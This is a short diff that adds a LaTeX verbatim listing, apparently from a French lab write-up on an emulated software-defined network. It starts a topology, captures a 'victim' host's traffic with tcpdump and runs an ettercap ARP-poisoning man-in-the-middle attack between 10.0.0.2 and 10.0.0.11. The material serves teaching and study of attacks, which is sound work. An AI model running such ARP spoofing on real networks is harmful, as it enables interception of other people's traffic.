@@ -1,0 +1,7 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+\PYGZdl{} sudo ./general\PYGZus{}topology.py \PYG{o}{[}addresse IP du contrôleur\PYG{o}{]}
+\PYGZdl{}\PYGZgt{} h2 ping h11 \PYG{p}{\PYGZam{}}
+\PYGZdl{}\PYGZgt{} h11 tcpdump \PYGZhy{}w scenario1/dump\PYGZus{}victim.pcap \PYGZhy{}i h11\PYGZhy{}eth0 \PYG{p}{\PYGZam{}}
+\PYGZdl{}\PYGZgt{} h6 ettercap \PYGZhy{}i h6\PYGZhy{}eth0 \PYGZhy{}T \PYGZhy{}w scenario1/dump\PYGZus{}attacker.pcap \PYGZhy{}M ARP
+/10.0.0.2// /10.0.0.11//
+\end{Verbatim}
